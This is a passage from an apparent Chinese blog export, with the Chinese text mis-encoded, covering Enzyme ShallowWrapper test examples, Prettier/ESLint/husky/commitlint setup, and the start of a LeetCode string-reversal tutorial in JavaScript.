‘æ˜¯å¦ä¸Žä¼ å…¥çš„æ ‘ç›¸ä¼¼ 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.equals(&lt;div className="foo bar" /&gt;)).to.equal(true); every(selector).every(selector) =&gt; Boolean è¿”å›žåŒ…è£…å™¨ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹æ˜¯å¦ä¸Žæä¾›çš„é€‰æ‹©å™¨åŒ¹é…ã€‚ 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo qoo" /&gt; &lt;div className="foo boo" /&gt; &lt;div className="foo hoo" /&gt; &lt;/div&gt;));expect(wrapper.find('.foo').every('.foo')).to.equal(true);expect(wrapper.find('.foo').every('.qoo')).to.equal(false);expect(wrapper.find('.foo').every('.bar')).to.equal(false); everyWhere(fn).everyWhere(fn) =&gt; Boolean 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo qoo" /&gt; &lt;div className="foo boo" /&gt; &lt;div className="foo hoo" /&gt; &lt;/div&gt;));expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('foo'))).to.equal(true);expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('qoo'))).to.equal(false);expect(wrapper.find('.foo').everyWhere(n =&gt; n.hasClass('bar'))).to.equal(false); exists([selector]).exists([selector]) =&gt; Boolean è¿”å›žåŒ…è£…å™¨ä¸­æ˜¯å¦å­˜åœ¨ä»»ä½•èŠ‚ç‚¹ã€‚æˆ–è€…ï¼Œå¦‚æžœä¼ å…¥é€‰æ‹©å™¨ï¼Œåˆ™è¯¥é€‰æ‹©å™¨æ˜¯å¦åœ¨åŒ…è£…å™¨ä¸­å…·æœ‰ä»»ä½•åŒ¹é…é¡¹ã€‚ 123const wrapper = mount(&lt;div className="some-class" /&gt;);expect(wrapper.exists('.some-class')).to.equal(true);expect(wrapper.find('.other-class').exists()).to.equal(false); filter(selector).filter(selector) =&gt; ShallowWrapper è¿”å›žä¸€ä¸ªæ–°çš„åŒ…è£…å™¨ï¼Œå…¶ä¸­åªåŒ…å«ä¸Žæä¾›çš„é€‰æ‹©å™¨åŒ¹é…çš„å½“å‰åŒ…è£…å™¨çš„èŠ‚ç‚¹ã€‚ 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.foo').filter('.bar')).to.have.lengthOf(1); filterWhere(fn).filterWhere(fn) =&gt; ShallowWrapper è¿”å›žä¸€ä¸ªæ–°çš„åŒ…è£…å™¨ï¼Œå®ƒåªåŒ…å«å½“å‰åŒ…è£…å™¨çš„èŠ‚ç‚¹ï¼Œå½“ä¼ é€’ç»™æä¾›çš„è°“è¯å‡½æ•°æ—¶ï¼Œè¿”å›žtrue 123const wrapper = shallow(&lt;MyComponent /&gt;);const complexFoo = wrapper.find('.foo').filterWhere(n =&gt; typeof n.type() !== 'string');expect(complexFoo).to.have.lengthOf(4); find(selector).find(selector) =&gt; ShallowWrapper æŸ¥æ‰¾å½“å‰åŒ…è£…å™¨çš„å‘ˆçŽ°æ ‘ä¸­ä¸Žæä¾›çš„é€‰æ‹©å™¨åŒ¹é…çš„æ¯ä¸ªèŠ‚ç‚¹ã€‚ 123456789101112131415161718192021import Foo from '../components/Foo';const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.foo')).to.have.lengthOf(1);expect(wrapper.find('.bar')).to.have.lengthOf(3);// compound selectorexpect(wrapper.find('div.some-class')).to.have.lengthOf(3);// CSS id selectorexpect(wrapper.find('#foo')).to.have.lengthOf(1);// ç»„ä»¶expect(wrapper.find(Foo)).to.have.lengthOf(1);// ç»„ä»¶æ˜¾ç¤ºåç§°expect(wrapper.find('Foo')).to.have.lengthOf(1);// å¯¹è±¡å±žæ€§é€‰æ‹©å™¨expect(wrapper.find(&#123; prop: 'value' &#125;)).to.have.lengthOf(1); findWhere(fn).findWhere(fn) =&gt; ShallowWrapper æŸ¥æ‰¾æ¸²æŸ“æ ‘ä¸­ä¸ºæä¾›çš„è°“è¯å‡½æ•°è¿”å›žtrueçš„æ¯ä¸ªèŠ‚ç‚¹ã€‚ 123const wrapper = shallow(&lt;MyComponent /&gt;);const complexComponents = wrapper.findWhere(n =&gt; n.type() !== 'string');expect(complexComponents).to.have.lengthOf(8); forEach(fn).forEach(fn) =&gt; Self è¿­ä»£å½“å‰åŒ…è£…å™¨çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä½¿ç”¨å›´ç»•ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„ç›¸åº”èŠ‚ç‚¹çš„åŒ…è£…å™¨æ‰§è¡Œæä¾›çš„å‡½æ•°ã€‚ 1234567891011const wrapper = shallow(( &lt;div&gt; &lt;div className="foo bax" /&gt; &lt;div className="foo bar" /&gt; &lt;div className="foo baz" /&gt; &lt;/div&gt;));wrapper.find('.foo').forEach((node) =&gt; &#123; expect(node.hasClass('foo')).to.equal(true);&#125;); get(index).get(index) =&gt; ReactElement 12const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find(Foo).get(0).props.foo).to.equal('bar'); getWrappingComponent().getWrappingComponent() =&gt; ShallowWrapper å¦‚æžœwrappingComponentä¼ å…¥äº†a optionsï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›žShallowWrapperæ¸²æŸ“çš„å‘¨å›´wrappingComponentã€‚è¿™ShallowWrapperå¯ä»¥ç”¨æ¥æ›´æ–°wrappingComponent propsï¼Œstateç­‰ã€‚ 123456789101112131415161718192021222324252627282930import &#123; Provider &#125; from 'react-redux';import &#123; Router &#125; from 'react-router';import store from './my/app/store';import mockStore from './my/app/mockStore';function MyProvider(props) &#123; const &#123; children, customStore &#125; = props; return ( &lt;Provider store=&#123;customStore || store&#125;&gt; &lt;Router&gt; &#123;children&#125; &lt;/Router&gt; &lt;/Provider&gt; );&#125;MyProvider.propTypes = &#123; children: PropTypes.node, customStore: PropTypes.shape(&#123;&#125;),&#125;;MyProvider.defaultProps = &#123; children: null, customStore: null,&#125;;const wrapper = shallow(&lt;MyComponent /&gt;, &#123; wrappingComponent: MyProvider,&#125;);const provider = wrapper.getWrappingComponent();provider.setProps(&#123; customStore: mockStore &#125;); getElement().getElement() =&gt; ReactElement è¿”å›žåŒ…è£…çš„ReactElementã€‚å¦‚æžœå½“å‰åŒ…è£…å™¨æ­£åœ¨åŒ…è£…æ ¹ç»„ä»¶ï¼Œåˆ™è¿”å›žæ ¹ç»„ä»¶çš„æœ€æ–°å‘ˆçŽ°è¾“å‡ºã€‚ 12345678910111213const element = ( &lt;div&gt; &lt;span /&gt; &lt;span /&gt; &lt;/div&gt;);function MyComponent() &#123; return element;&#125;const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.getElement()).to.equal(element); getElements().getElements() =&gt; Array&lt;ReactElement&gt; 1234567891011121314const one = &lt;span /&gt;;const two = &lt;span /&gt;;function Test() &#123; return ( &lt;div&gt; &#123;one&#125; &#123;two&#125; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Test /&gt;);expect(wrapper.find('span').getElements()).to.deep.equal([one, two]); hasClass(className).hasClass(className) =&gt; Boolean è¿”å›žåŒ…è£…èŠ‚ç‚¹æ˜¯å¦å…·æœ‰classNameåŒ…å«ä¼ å…¥çš„ç±»åç§°çš„propã€‚å®ƒå¿…é¡»æ˜¯å•èŠ‚ç‚¹åŒ…è£…å™¨ã€‚ 12345const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.find('.my-button').hasClass('disabled')).to.equal(true);// æ­£åˆ™expect(wrapper.find('.my-button').hasClass(/(ComponentName)-(other)-(\d+)/)).to.equal(true); hostNodes().hostNodes() =&gt; ShallowWrapper è¿”å›žä»…åŒ…å«ä¸»æœºèŠ‚ç‚¹çš„æ–°åŒ…è£…å™¨ã€‚å½“ä½¿ç”¨react-domï¼Œä¸»æœºèŠ‚ç‚¹æ˜¯HTMLå…ƒç´ ï¼Œè€Œä¸æ˜¯å®šåˆ¶ååº”çš„ç»„åˆ† 12345678const wrapper = shallow(( &lt;div&gt; &lt;MyComponent className="foo" /&gt; &lt;span className="foo" /&gt; &lt;/div&gt;));const twoNodes = wrapper.find('.foo');expect(twoNodes.hostNodes()).to.have.lengthOf(1); html().html() =&gt; String è¿”å›žæ•´ä¸ªå½“å‰æ¸²æŸ“æ ‘ï¼ˆä¸ä»…ä»…æ˜¯æµ…æ¸²æŸ“éƒ¨åˆ†ï¼‰çš„æ¸²æŸ“HTMLæ ‡è®°çš„å­—ç¬¦ä¸²ã€‚åªèƒ½åœ¨å•ä¸ªèŠ‚ç‚¹çš„åŒ…è£…å™¨ä¸Šè°ƒç”¨ 123456789101112131415161718function Foo() &#123; return (&lt;div className="in-foo" /&gt;);&#125;function Bar() &#123; return ( &lt;div className="in-bar"&gt; &lt;Foo /&gt; &lt;/div&gt; );&#125;const wrapper = shallow(&lt;Bar /&gt;);expect(wrapper.html()).to.equal('&lt;div class="in-bar"&gt;&lt;div class="in-foo"&gt;&lt;/div&gt;&lt;/div&gt;');expect(wrapper.find(Foo).html()).to.equal('&lt;div class="in-foo"&gt;&lt;/div&gt;');const wrapper = shallow(&lt;div&gt;&lt;b&gt;important&lt;/b&gt;&lt;/div&gt;);expect(wrapper.html()).to.equal('&lt;div&gt;&lt;b&gt;important&lt;/b&gt;&lt;/div&gt;'); instance().instance() =&gt; ReactComponent è¿”å›žå•èŠ‚ç‚¹åŒ…è£…å™¨èŠ‚ç‚¹çš„åº•å±‚ç±»å®žä¾‹; thisåœ¨å®ƒçš„æ–¹æ³•ã€‚ 1234567891011121314151617181920212223function Stateless() &#123; return &lt;div&gt;Stateless&lt;/div&gt;;&#125;class Stateful extends React.Component &#123; render() &#123; return &lt;div&gt;Stateful&lt;/div&gt;; &#125;&#125;test('shallow wrapper instance should be null', () =&gt; &#123; const wrapper = shallow(&lt;Stateless /&gt;); const instance = wrapper.instance(); expect(instance).to.equal(null);&#125;);test('shallow wrapper instance should not be null', () =&gt; &#123; const wrapper = shallow(&lt;Stateful /&gt;); const instance = wrapper.instance(); expect(instance).to.be.instanceOf(Stateful);&#125;); is(selector).is(selector) =&gt; Boolean è¿”å›žå•ä¸ªåŒ…è£…èŠ‚ç‚¹æ˜¯å¦ä¸Žæä¾›çš„é€‰æ‹©å™¨åŒ¹é…ã€‚å®ƒå¿…é¡»æ˜¯å•èŠ‚ç‚¹åŒ…è£…å™¨ã€‚ 12const wrapper = shallow(&lt;div className="some-class other-class" /&gt;);expect(wrapper.is('.some-class')).to.equal(true); isEmptyRender().isEmptyRender() =&gt; Boolean è¿”å›žåŒ…è£…å™¨æ˜¯å¦æœ€ç»ˆåªå‘ˆçŽ°å…è®¸çš„å‡å€¼ï¼šfalseæˆ–nullã€‚ 123456function Foo() &#123; return null;&#125;const wrapper = shallow(&lt;Foo /&gt;);expect(wrapper.isEmptyRender()).to.equal(true); key().key() =&gt; String è¿”å›žå½“å‰åŒ…è£…å™¨èŠ‚ç‚¹çš„é”®å€¼ã€‚å®ƒå¿…é¡»æ˜¯å•èŠ‚ç‚¹åŒ…è£…å™¨ã€‚ 1234567const wrapper = shallow(( &lt;ul&gt; &#123;['foo', 'bar'].map(s =&gt; &lt;li key=&#123;s&#125;&gt;&#123;s&#125;&lt;/li&gt;)&#125; &lt;/ul&gt;)).find('li');expect(wrapper.at(0).key()).to.equal('foo');expect(wrapper.at(1).key()).to.equal('bar'); map(fn).map(fn) =&gt; Array&lt;Any&gt; å°†å½“å‰èŠ‚ç‚¹æ•°ç»„æ˜ å°„åˆ°å¦ä¸€ä¸ªæ•°ç»„ã€‚æ¯ä¸ªèŠ‚ç‚¹ä½œä¸ºaä¼ é€’ShallowWrapper ç»™mapå‡½æ•°ã€‚ 12345678910const wrapper = shallow(( &lt;div&gt; &lt;div className="foo"&gt;bax&lt;/div&gt; &lt;div className="foo"&gt;bar&lt;/div&gt; &lt;div className="foo"&gt;baz&lt;/div&gt; &lt;/div&gt;));const texts = wrapper.find('.foo').map(node =&gt; node.text());expect(texts).to.eql(['bax', 'bar', 'baz']); matchesElement(patternNode).matchesElement(patternNode) =&gt; Boolean å›žç»™å®šçš„reactå…ƒç´ æ˜¯å¦patternNodeä¸ŽåŒ…è£…å™¨çš„æ¸²æŸ“æ ‘åŒ¹é…ã€‚å®ƒå¿…é¡»æ˜¯å•èŠ‚ç‚¹åŒ…è£…å™¨ï¼Œå¹¶ä¸”ä»…æ£€æŸ¥æ ¹èŠ‚ç‚¹ã€‚ è¿™äº›patternNodeè¡Œä¸ºå°±åƒä¸€å¼ é€šé…ç¬¦ã€‚ä¸ºäº†åŒ¹é…åŒ…è£…å™¨ä¸­çš„èŠ‚ç‚¹ï¼š æ ‡ç­¾åç§°å¿…é¡»åŒ¹é… å†…å®¹å¿…é¡»åŒ¹é…ï¼šåœ¨æ–‡æœ¬èŠ‚ç‚¹ä¸­ï¼Œå‰å¯¼å’Œå°¾éšç©ºæ ¼è¢«å¿½ç•¥ï¼Œä½†ä¸­é—´ç©ºé—´ä¸è¢«å¿½ç•¥ã€‚å­å…ƒç´ å¿…é¡»æ ¹æ®è¿™äº›è§„åˆ™ä»¥é€’å½’æ–¹å¼åŒ¹é…ã€‚ patternNodepropsï¼ˆattributesï¼‰å¿…é¡»å‡ºçŽ°åœ¨åŒ…è£…å™¨çš„èŠ‚ç‚¹ä¸­ï¼Œè€Œä¸æ˜¯ç›¸åã€‚å¦‚æžœå®ƒä»¬å‡ºçŽ°ï¼Œå®ƒä»¬çš„å€¼å¿…é¡»åŒ¹é…ã€‚ patternNodeæ ·å¼CSSå±žæ€§å¿…é¡»å‡ºçŽ°åœ¨åŒ…è£…å™¨èŠ‚ç‚¹çš„æ ·å¼ä¸­ï¼Œè€Œä¸æ˜¯ç›¸åã€‚å¦‚æžœå®ƒä»¬å‡ºçŽ°ï¼Œå®ƒä»¬çš„å€¼å¿…é¡»åŒ¹é…ã€‚ 1234567891011121314151617181920class MyComponent extends React.Component &#123; constructor(props) &#123; super(props); this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; // ... &#125; render() &#123; return ( &lt;button type="button" onClick=&#123;this.handleClick&#125; className="foo bar"&gt;Hello&lt;/button&gt; ); &#125;&#125;const wrapper = shallow(&lt;MyComponent /&gt;);expect(wrapper.matchesElement(&lt;button&gt;Hello&lt;/button&gt;)).to.equal(true);expect(wrapper.matchesElement(&lt;button className="foo bar"&gt;Hello&lt;/button&gt;)).to.equal(true); name().name() =&gt; String|null è¿”å›žæ­¤åŒ…è£…å™¨çš„å½“å‰èŠ‚ç‚¹çš„åç§°ã€‚å¦‚æžœå®ƒæ˜¯å¤åˆç»„ä»¶ï¼Œåˆ™è¿™å°†æ˜¯æœ€é¡¶å±‚æ¸²æŸ“ç»„ä»¶çš„åç§°ã€‚å¦‚æžœå®ƒæ˜¯æœ¬æœºDOMèŠ‚ç‚¹ï¼Œåˆ™å®ƒå°†æ˜¯æ ‡è®°åç§°çš„å­—ç¬¦ä¸²ã€‚å¦‚æžœæ˜¯çš„è¯nullï¼Œé‚£å°±æ˜¯nullã€‚ è¿”å›žåç§°çš„ä¼˜å…ˆé¡ºåºæ˜¯ï¼štype.displayName- &gt; type.name- &gt; typeã€‚ 123456789101112131415const wrapper = shallow(&lt;div /&gt;);expect(wrapper.name()).to.equal('div');function SomeWrappingComponent() &#123; return &lt;Foo /&gt;;&#125;const wrapper = shallow(&lt;SomeWrappingComponent /&gt;);expect(wrapper.name()).to.equal('Foo');Foo.displayName = 'A cool custom name';function SomeWrappingComponent() &#123; return &lt;Foo /&gt;;&#125;const wrapper = shallow(&lt;SomeWrappingComponent /&gt;);expect(wrapper.name()).to.equal('A cool custom name'); å‚è€ƒé“¾æŽ¥ å‰ç«¯è¦å­¦çš„æµ‹è¯•è¯¾ ä»ŽJestå…¥é—¨åˆ°TDD/BDDåŒå®žæˆ˜ jest å®˜æ–¹æ–‡æ¡£ enzymeå®˜æ–¹æ–‡æ¡£]]></content>
      <categories>
        <category>æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨(eslint+prettier)]]></title>
    <url>%2F2019-08-08-%E5%B7%A5%E6%AC%B2%E5%96%84%E5%85%B6%E4%BA%8B%EF%BC%8C%E5%BF%85%E5%85%88%E5%88%A9%E5%85%B6%E5%99%A8(eslint%2Bprettier).html</url>
    <content type="text"><![CDATA[å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨(eslint+prettier)Prettierå®˜ç½‘ ä»€ä¹ˆå«Prettierï¼ŸPrettieræ˜¯ä¸€ä¸ªå›ºå®šçš„ä»£ç æ ¼å¼åŒ–ç¨‹åºï¼Œæ”¯æŒï¼š JavaScriptï¼ŒåŒ…æ‹¬ES2017 JSX Angular Vue Flow TS CSSï¼ŒLesså’ŒSCSS HTML JSON GraphQL Markdownï¼ŒåŒ…æ‹¬GFMå’ŒMDX YAML å®‰è£…123456789# yarnyarn add prettier --dev --exact# å…¨å±€yarn global add prettier# npmnpm install --save-dev --save-exact prettier# å…¨å±€npm install --global prettier åŸºæœ¬é…ç½®12345678910111213141516171819202122232425262728&#123; // æŽ’ç‰ˆå®½åº¦,å³æ¯è¡Œæœ€å¤§å®½åº¦ï¼Œé»˜è®¤å€¼æ˜¯80 "printWidth":100, // åˆ¶è¡¨ç¬¦å®½åº¦ï¼Œæ¯ä¸ªå±‚çº§ç¼©è¿›å‡ ä¸ªç©ºæ ¼ï¼Œé»˜è®¤å€¼ä¸º2 "tabWidth": 2, // æ˜¯å¦ä½¿ç”¨ tab æ›¿ä»£ space ä¸ºå•ä½ç¼©è¿›ï¼Œé»˜è®¤å€¼ä¸ºfalse "useTabs": false, // åˆ†å·ï¼Œå¥å°¾æ˜¯å¦è‡ªåŠ¨è¡¥å…¨åˆ†å·ï¼Œé»˜è®¤ä¸ºtrue "semi": true, // å¯ç”¨åŒå¼•å·ï¼Œä¸å¯ç”¨å•å¼•å·,é»˜è®¤ä¸ºtrue "singleQuote": true, // åœ¨ JSX æ–‡ä»¶ä¸­ä½¿ç”¨å•å¼•å·æ›¿ä»£åŒå¼•å·ï¼Œé»˜è®¤ä¸º false "jsxSingleQuote": true, // ä¸ºå¤šè¡Œæ•°ç»„çš„éžæœ«å°¾æ·»åŠ é€—å·ï¼ˆå•è¡Œæ•°ç»„ä¸éœ€è¦é€—å·ï¼‰ï¼Œæ•°å€¼ï¼šnone(ä¸æ·»åŠ é€—å·)ã€es5(åœ¨ES5ä¸­ç”Ÿæ•ˆçš„é€—å·ï¼Œå¯¹è±¡æ•°ç»„ç­‰)ï¼Œall(ä»»ä½•å¯ä»¥æ·»åŠ é€—å·çš„åœ°æ–¹) "trailingComma": "es5", // æ‹¬å·ç©ºæ ¼ï¼Œåœ¨å¯¹è±¡å­—é¢é‡å’Œæ‹¬å·ä¹‹é—´æ·»åŠ ç©ºæ ¼ï¼Œé»˜è®¤ä¸º true "bracketSpacing": true, // å°†å¤šè¡Œ JSX å…ƒç´ çš„ &gt; æ”¾ç½®äºŽæœ€åŽä¸€è¡Œçš„æœ«å°¾ï¼Œè€Œéžæ¢è¡Œã€‚é»˜è®¤ä¸º false "jsxBracketSameLine": false, // ç®­å¤´å‡½æ•°åœ†æ‹¬å·ï¼Œé»˜è®¤ä¸º avoid(åœ¨å¯ä»¥æ¶ˆé™¤çš„æƒ…å†µä¸‹ï¼Œæ¶ˆé™¤æ‹¬å·)ï¼Œalways(ä¸€ç›´ä¿ç•™æ‹¬å·) "arrowParens": "avoid", "overrides": [ &#123; "files": ".prettierrc", "options": &#123; "parser": "json" &#125; &#125; ]&#125; Eslintä»£ç è§„èŒƒå˜é‡å‘½åå‘½åå¿…é¡»ä¼ é€’è¶³å¤Ÿçš„ä¿¡æ¯ã€‚fetchUserInfoAsyncæ¯”getDataæ›´åŠ å…·ä½“ å‘½ååŸºç¡€ åŠè‡ªåŠ¨æž„å»ºhuskyHusky å¯ä»¥é˜»æ­¢æ— æ•ˆçš„ git commitã€git pushä»¥åŠå…¶ä»–woffè¡Œä¸º 1npm install husky --save-dev lint-stagedé’ˆå¯¹æš‚å­˜çš„gitæ–‡ä»¶è¿è¡Œlinterså¹¶ä¸”ä¸è¦è®©ðŸ’©æ»‘å…¥ä½ çš„ä»£ç åº“ï¼ 1npm install lint-staged --save-dev commitlintè§„èŒƒ commit message,ä¾¿äºŽè‡ªåŠ¨ç”Ÿæˆ CHANGELOG 1npm install commitlint @commitlint/cli @commitlint/config-conventional --save-dev é…ç½®ï¼š 12345678910111213141516171819202122// commitlint.config.jsmodule.exports = &#123; extends: ["@commitlint/config-conventional"], rules: &#123; "type-enum": [ 2, "always", ["feat", "fix", "docs", "style", "refactor", "test", "chore", "revert"] ], "subject-full-stop": [0, "never"], "subject-case": [0, "never"] &#125;&#125;/** * featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ * fixï¼šä¿®è¡¥bug * docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰ * styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ * refactorï¼šé‡æž„ï¼ˆå³ä¸æ˜¯æ–°å¢žåŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ * testï¼šå¢žåŠ æµ‹è¯• * choreï¼šæž„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨*/ conventional-changelogè‡ªåŠ¨ç”Ÿæˆ CHANGELOG 1npm install conventional-changelog conventional-changelog-cli --save-dev package.json1234567891011121314151617181920212223242526272829&#123; "scripts": &#123; "start": "concurrently \"node scripts/start.js\" \"npm run mock\"", "build": "node scripts/build.js", "test": "node scripts/test.js", "eslint": "eslint --fix **/*.js", "prettier": "prettier --write ./src/**/**/**/*", "mock": "json-server --watch db.json --port 3004", "changelog": "conventional-changelog -p angular -i CHANGELOG.md -s -r 0" &#125;, "husky": &#123; "hooks": &#123; "pre-commit": "lint-staged", "commit-msg": "commitlint -E HUSKY_GIT_PARAMS" &#125; &#125;, "lint-staged": &#123; "src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125;": [ "prettier --write ./src/**/**/**/*", "eslint --fix **/*.js", "git add" ] &#125;, "config": &#123; "commitizen": &#123; "path": "cz-customizable" &#125; &#125;, &#125; commit&amp;push1234567891011121314151617181920212223242526272829303132# å½“æœ‰æ–°çš„æ”¹å˜git add .# æäº¤ï¼Œè¾“å…¥ä¸è§„èŒƒçš„æäº¤ä¿¡æ¯ï¼Œå…ˆæ ¡éªŒä»£ç ï¼Œ æç¤ºä¸è§„èŒƒï¼Œå¹¶ä¸”ä¸é€šè¿‡git commit -m "test"# è¾“å…¥è§„èŒƒä¿¡æ¯ï¼Œè§„èŒƒè‡ªè¡Œç™¾åº¦ï¼Œä¹Ÿå¯ä»¥ä»Ž commitlint.config.jsä¸­çœ‹å‡ºã€‚è¿è¡Œé’©å­è‡ªåŠ¨prettierï¼ŒæŽ¥ç€è¿è¡Œ eslint,æ²¡æœ‰æŠ¥é”™åˆ™ git addï¼Œå¹¶å¼€å§‹æ ¡éªŒæäº¤ä¿¡æ¯æ˜¯å¦è§„èŒƒï¼Œæ— è¯¯åŽé¡ºåˆ©æäº¤git commit -m "feat: add semi-automatic construction"husky &gt; pre-commit (node v10.15.3)Stashing changes... [started]Stashing changes... [skipped]â†’ No partially staged files found...Running tasks... [started]Running tasks for src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125; [started]prettier --write ./src/**/**/**/* [started]prettier --write ./src/**/**/**/* [completed]eslint --fix **/*.js [started]eslint --fix **/*.js [completed]git add [started]git add [completed]Running tasks for src/**/*.&#123;jsx,txs,ts,js,json,css,md&#125; [completed]Running tasks... [completed]husky &gt; commit-msg (node v10.15.3)[master 9afdd76] test: lint-staged 1 file changed, 1 insertion(+) # æŽ¨é€åˆ° orgingit push# ç”Ÿæˆ changelognpm run changelog&gt; conventional-changelog -p angular -i CHANGELOG.md -s -r 0 CSSæ ·å¼é¡ºåºç›¸å…³å±žæ€§åº”è¯¥ä¸ºä¸€ç»„ï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„æ ·å¼ä¸ºç¼–å†™é¡ºåº Positioning Box model Typographic Visual 123456789101112131415161718192021222324252627282930.declaration-order&#123; /* Positioning */ position: absolute; top: 0; right: 0; bottom: 0; left: 0; z-index: 100; /* Box model */ display:block; box-sizing: border-box; width: 100px; height: 100px; padding: 10px; border: 1px solid #666; border-radius: 5px; margin: 10px; float: right; overflow: hidden; /* Typographic */ font: normal 12px 'Helvetica Neue',sans-serif; line-height: 1.5; text-align: center; /* Visual */ background-color: #333; color: #fff; opacity: 0.8; /* Other */ cursor: pointer;&#125; å‚è€ƒé“¾æŽ¥ï¼š ç¼–å†™ã€Œå¯è¯»ã€ä»£ç çš„å®žè·µ å‰ç«¯å¼€å‘è§„èŒƒä¹‹å‘½åè§„èŒƒã€htmlè§„èŒƒã€cssè§„èŒƒã€jsè§„èŒƒ Prettier eslint airbnbè§„èŒƒ eslint-plugin-react eslint-config-alloy eslint-plugin-jsx-a11y husky lint-staged commitlint]]></content>
      <categories>
        <category>è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>è§„èŒƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»ŽleetCodeå­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸ŽåŸºç¡€ç®—æ³•]]></title>
    <url>%2F2019-07-03-%E4%BB%8EleetCode%E5%AD%A6%E4%B9%A0JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[å¾ªåºæ¸è¿›ï¼Œä¿æŒç©ºæ¯ ä»ŽleetCodeå­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸ŽåŸºç¡€ç®—æ³•ç®€å•ç®—æ³•ï¼š å­—ç¬¦ä¸²ã€æ•°ç»„ã€æ­£åˆ™ã€æŽ’åºã€é€’å½’ å­—ç¬¦ä¸²åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯â‘¢ ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œéœ€è¦åè½¬å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯çš„å­—ç¬¦é¡ºåºï¼ŒåŒæ—¶ä»ä¿ç•™ç©ºæ ¼å’Œå•è¯çš„åˆå§‹é¡ºåº å®žä¾‹ï¼š 12è¾“å…¥ï¼š"Let's take LeetCode contest"è¾“å‡ºï¼š"s'teL ekat edoCteeL tsetnoc" æ³¨æ„ï¼šåœ¨å­—ç¬¦ä¸²ä¸­ï¼Œæ¯ä¸ªå•è¯ç”±å•ä¸ªç©ºæ ¼åˆ†éš”ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²ä¸­ä¸ä¼šæœ‰ä»»ä½•é¢å¤–çš„ç©ºæ ¼ 123456789101112131415/*** @param &#123;string&#125; s* @return &#123;string&#125;*/const reverseWords = function(s)&#123; // 1.å­—ç¬¦ä¸²æŒ‰ç©ºæ ¼è¿›è¡Œåˆ†éš”ï¼Œæ•°ç»„çš„å…ƒç´ çš„å…ˆåŽé¡ºåºå°±æ˜¯å•è¯çš„é¡ºåº // 2.éåŽ†æ•°ç»„çš„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªå•è¯Stringï¼Œé€šè¿‡ splitåˆ†éš”è½¬Array åŒæ—¶ç”¨Array è‡ªå¸¦çš„ reverseæ–¹æ³•å°†æ¯ä¸ªå•è¯æ•°ç»„åˆ†éš”åŽäº§ç”Ÿçš„æ•°ç»„åè½¬ // 3.æŽ¥ç€ç”¨join('')å°†å•è¯æ•°ç»„ä¸­çš„æ¯ä¸ªæ•°ç»„æ‹¼å‡‘æˆå­—ç¬¦ä¸² // 4.æœ€åŽå°†å­—ç¬¦ä¸²å•è¯æ•°ç»„æ‹¼å‡‘ä¸ºæœ€ç»ˆçš„å­—ç¬¦ä¸² return s.split(' ').map(i=&gt;i.split('').reverse().join('')).join(' ') // æˆ–è€…ç”¨æ­£åˆ™ï¼ŒåŒ¹é…ç©ºæ ¼ return s.split(/\s/g).map(i=&gt;i.split('').reverse().join('')).join(' ') // åŒ¹é…å•è¯(match) return s.match(/[\w']+/g).map(i=&gt;i.split('').reverse().join('')).join(' ')&#125; æµ‹è¯•ç”¨ä¾‹ï¼š 12345import reverseByWord from '../../code/string/lession1'test('reverseByWord:Let\'s take LeetCode contest', () =&gt; &#123; expect(reverseByWord("Let's take LeetCode contest")).toBe("s'teL ekat edoCteeL tsetnoc")&#125;) çŸ¥è¯†ç‚¹ï¼š String.prototype.splitã€String.prototype.matchã€Array.prototype.mapã€Array.prototype.reverseã€Array.prototype.join æ‰©å±•ï¼šä¸Šé¢è®²çš„æ˜¯å•ä¸ªç©ºæ ¼éš”å¼€ï¼Œé‚£å¦‚æžœä¸æ˜¯å½“ä¸ªç©ºæ ¼å‘¢ï¼Ÿ 1234567// åŒæ ·å¯ä»¥ä½¿ç”¨æ­£åˆ™çš„è´ªå©ªåŒ¹é…æ¥è§£å†³const reverseWords = function(s)&#123; // æˆ–è€…ç”¨æ­£åˆ™ï¼ŒåŒ¹é…ç©ºæ ¼ return s.split(/\s+/g).map(i=&gt;i.split('').reverse().join('')).join(' ') // åŒ¹é…å•è¯(match) return 